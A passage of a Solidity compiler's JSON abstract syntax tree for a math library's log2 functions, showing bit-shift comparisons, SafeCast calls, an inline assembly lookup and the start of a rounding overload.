"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26387:34:6","typeDescriptions":{"typeIdentifier":"t_rational_340282366920938463463374607431768211455_by_1","typeString":"int_const 3402...(31 digits omitted)...1455"},"value":"0xffffffffffffffffffffffffffffffff"},"src":"26383:38:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3273,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26367:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3274,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26376:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26367:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3278,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26367:55:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"37","id":3279,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26426:1:6","typeDescriptions":{"typeIdentifier":"t_rational_7_by_1","typeString":"int_const 7"},"value":"7"},"src":"26367:60:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26363:64:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3282,"nodeType":"ExpressionStatement","src":"26363:64:6"},{"expression":{"id":3295,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3283,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26503:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3294,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3291,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3288,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3286,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"26525:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3287,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26530:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26525:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3289,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"26524:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307866666666666666666666666666666666","id":3290,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26535:18:6","typeDescriptions":{"typeIdentifier":"t_rational_18446744073709551615_by_1","typeString":"int_const 18446744073709551615"},"value":"0xffffffffffffffff"},"src":"26524:29:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3284,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26508:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3285,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26517:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26508:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3292,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26508:46:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"36","id":3293,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26558:1:6","typeDescriptions":{"typeIdentifier":"t_rational_6_by_1","typeString":"int_const 6"},"value":"6"},"src":"26508:51:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26503:56:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3296,"nodeType":"ExpressionStatement","src":"26503:56:6"},{"expression":{"id":3309,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3297,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26634:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3308,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3305,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3302,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3300,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"26656:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3301,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26661:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26656:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3303,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"26655:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666666666666666","id":3304,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26666:10:6","typeDescriptions":{"typeIdentifier":"t_rational_4294967295_by_1","typeString":"int_const 4294967295"},"value":"0xffffffff"},"src":"26655:21:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3298,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26639:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3299,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26648:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26639:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3306,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26639:38:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"35","id":3307,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26681:1:6","typeDescriptions":{"typeIdentifier":"t_rational_5_by_1","typeString":"int_const 5"},"value":"5"},"src":"26639:43:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26634:48:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3310,"nodeType":"ExpressionStatement","src":"26634:48:6"},{"expression":{"id":3323,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3311,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26757:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3322,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3319,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3316,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3314,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"26779:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3315,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26784:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26779:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3317,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"26778:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307866666666","id":3318,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26789:6:6","typeDescriptions":{"typeIdentifier":"t_rational_65535_by_1","typeString":"int_const 65535"},"value":"0xffff"},"src":"26778:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3312,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26762:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3313,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26771:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26762:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3320,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26762:34:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"34","id":3321,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26800:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"26762:39:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26757:44:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3324,"nodeType":"ExpressionStatement","src":"26757:44:6"},{"expression":{"id":3337,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3325,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26874:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3336,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3333,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3330,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3328,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"26896:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3329,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26901:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26896:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3331,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"26895:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666","id":3332,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26906:4:6","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 255"},"value":"0xff"},"src":"26895:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3326,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26879:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3327,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"26888:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26879:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3334,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26879:32:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"33","id":3335,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"26915:1:6","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"src":"26879:37:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26874:42:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3338,"nodeType":"ExpressionStatement","src":"26874:42:6"},{"expression":{"id":3351,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3339,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"26988:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3350,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3347,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3344,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3342,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3267,"src":"27010:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3343,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3270,"src":"27015:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"27010:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3345,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"27009:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307866","id":3346,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"27020:3:6","typeDescriptions":{"typeIdentifier":"t_rational_15_by_1","typeString":"int_const 15"},"value":"0xf"},"src":"27009:14:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3340,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"26993:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3341,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"27002:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"26993:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3348,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"26993:31:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"32","id":3349,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"27028:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"26993:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"26988:41:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3352,"nodeType":"ExpressionStatement","src":"26988:41:6"},{"AST":{"nativeSrc":"28490:119:6","nodeType":"YulBlock","src":"28490:119:6","statements":[{"nativeSrc":"28504:95:6","nodeType":"YulAssignment","src":"28504:95:6","value":{"arguments":[{"name":"r","nativeSrc":"28512:1:6","nodeType":"YulIdentifier","src":"28512:1:6"},{"arguments":[{"arguments":[{"name":"r","nativeSrc":"28524:1:6","nodeType":"YulIdentifier","src":"28524:1:6"},{"name":"x","nativeSrc":"28527:1:6","nodeType":"YulIdentifier","src":"28527:1:6"}],"functionName":{"name":"shr","nativeSrc":"28520:3:6","nodeType":"YulIdentifier","src":"28520:3:6"},"nativeSrc":"28520:9:6","nodeType":"YulFunctionCall","src":"28520:9:6"},{"kind":"number","nativeSrc":"28531:66:6","nodeType":"YulLiteral","src":"28531:66:6","type":"","value":"0x0000010102020202030303030303030300000000000000000000000000000000"}],"functionName":{"name":"byte","nativeSrc":"28515:4:6","nodeType":"YulIdentifier","src":"28515:4:6"},"nativeSrc":"28515:83:6","nodeType":"YulFunctionCall","src":"28515:83:6"}],"functionName":{"name":"or","nativeSrc":"28509:2:6","nodeType":"YulIdentifier","src":"28509:2:6"},"nativeSrc":"28509:90:6","nodeType":"YulFunctionCall","src":"28509:90:6"},"variableNames":[{"name":"r","nativeSrc":"28504:1:6","nodeType":"YulIdentifier","src":"28504:1:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":3270,"isOffset":false,"isSlot":false,"src":"28504:1:6","valueSize":1},{"declaration":3270,"isOffset":false,"isSlot":false,"src":"28512:1:6","valueSize":1},{"declaration":3270,"isOffset":false,"isSlot":false,"src":"28524:1:6","valueSize":1},{"declaration":3267,"isOffset":false,"isSlot":false,"src":"28527:1:6","valueSize":1}],"flags":["memory-safe"],"id":3353,"nodeType":"InlineAssembly","src":"28465:144:6"}]},"documentation":{"id":3265,"nodeType":"StructuredDocumentation","src":"26098:119:6","text":" @dev Return the log in base 2 of a positive value rounded towards zero.\n Returns 0 if given 0."},"id":3355,"implemented":true,"kind":"function","modifiers":[],"name":"log2","nameLocation":"26231:4:6","nodeType":"FunctionDefinition","parameters":{"id":3268,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3267,"mutability":"mutable","name":"x","nameLocation":"26244:1:6","nodeType":"VariableDeclaration","scope":3355,"src":"26236:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3266,"name":"uint256","nodeType":"ElementaryTypeName","src":"26236:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"26235:11:6"},"returnParameters":{"id":3271,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3270,"mutability":"mutable","name":"r","nameLocation":"26278:1:6","nodeType":"VariableDeclaration","scope":3355,"src":"26270:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3269,"name":"uint256","nodeType":"ElementaryTypeName","src":"26270:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"26269:11:6"},"scope":3686,"src":"26222:2393:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3388,"nodeType":"Block","src":"28848:175:6","statements":[{"id":3387,"nodeType":"UncheckedBlock","src":"28858:159:6","statements":[{"assignments":[3367],"declarations":[{"constant":false,"id":3367,"mutability":"mutable","name":"result","nameLocation":"28890:6:6","nodeType":"VariableDeclaration","scope":3387,"src":"28882:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3366,"name":"uint256","nodeType":"ElementaryTypeName","src":"28882:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3371,"initialValue":{"arguments":[{"id":3369,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3358,"src":"28904:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3368,"name":"log2","nodeType":"Identifier","overloadedDeclarations":[3355,3389],"referencedDeclaration":3355,"src":"28899:4:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":3370,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28899:11:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"28882:28:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3385,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3372,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3367,"src":"28931:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":3383,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":3376,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3361,"src":"28973:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":3375,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"28956:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":3377,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28956:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3382,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3380,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3378,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"28986:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"id":3379,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3367,"src":"28991:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"28986:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":3381,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3358,"src":"29000:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"28986:19:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"28956:49:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3373,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"28940:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3374,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"28949:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"28940:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3384,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"28940:66:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"28931:75:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3365,"id":3386,"nodeType":"Return","src":"28924:82:6"}]}]},"documentation":{"id":3356,"nodeType":"StructuredDocumentation","src":"28621:142:6","text":" @dev Return the log in base 2, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":3389,"implemented":true,"kind":"function","modifiers":[],"name":"log2","nameLocation":"28777:4:6","nodeType":"FunctionDefinition","parameters":{"id":3362,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3358,"mutability":"mutable","name":"value","nameLocation":"28790:5:6","nodeType":"VariableDeclaration","scope":3389,"src":"28782:13:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3357,"name":"uint256","nodeType":"ElementaryTypeName","src":"28782:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":3361,"mutability":"mutable","name":"rounding","nameLocation":"28806:8:6","nodeType":"VariableDeclaration","scope":3389,"src":"28797:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":3360,"nodeType":"UserDefinedTypeName","pathNode":{"id":3359,"name":"Rounding","nameLocations":["28797:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"28797:8:6"},"referencedDeclaration":2077,"src":"28797:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum 